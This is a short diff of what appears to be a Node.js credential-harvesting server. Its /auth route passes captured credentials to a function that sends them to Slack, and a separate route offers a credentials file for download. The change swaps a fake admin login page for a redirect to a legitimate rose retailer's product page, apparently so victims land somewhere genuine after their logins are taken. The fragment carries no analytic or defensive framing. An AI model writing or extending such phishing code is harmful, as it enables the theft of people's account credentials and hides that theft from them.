@@ -30,8 +30,10 @@ app.get("/auth", (req, res) => {
     enviarASlack(credencialesOpen);
   }
 
-  const filePath = path.join(__dirname, "edradminlogin.html");
-  res.sendFile(filePath);
+  // const filePath = path.join(__dirname, "edradminlogin.html");
+  res.redirect(
+    "https://www.ecuadordirectroses.com/product/freedom-red-rose-super-premium"
+  );
 });
 
 // Ruta para descargar el archivo credenciales.txt
